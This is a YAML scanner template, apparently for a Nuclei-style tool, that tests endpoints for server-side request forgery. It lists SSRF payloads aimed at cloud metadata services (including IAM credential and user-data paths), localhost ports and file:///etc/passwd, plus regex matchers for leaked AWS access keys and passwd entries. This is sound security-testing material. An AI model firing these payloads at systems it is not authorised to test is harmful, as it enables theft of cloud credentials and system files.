id: generic-ssrf
info:
  name: Server-Side Request Forgery
  description: Tests for SSRF vulnerabilities
  owasp_category: A05:2025
  severity: high
  tags:
    - ssrf
    - request-forgery
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "{{url_param}}"

  payloads:
    - "http://169.254.169.254/latest/meta-data/iam/"
    - "http://127.0.0.1:80"
    - "http://localhost:22"
    - "file:///etc/passwd"
    - "http://[::1]/"
    - "http://metadata.google.internal/computeMetadata/v1/"
    - "http://169.254.169.254/latest/user-data"
    - "http://169.254.169.254/latest/static/"

  matchers:
    - type: status
      condition: in
      status:
        - 200
        - 201
    - type: regex
      condition: or
      regex:
        - 'Code.*:.*[A-Z0-9]{4}'
        - 'AccessKeyId'
        - 'SecretAccessKey'
        - 'ami-[a-f0-9]{8,17}'
        - 'instance-id'
        - 'iam/security-credentials'
        - 'root:x:[0-9]+:[0-9]+:'
        - 'OpenSSH'
        - 'ssh-[0-9]'
        - 'compute-metadata'
        - 'meta-data'
        - 'user-data'
      part: body

  matchers_condition: and
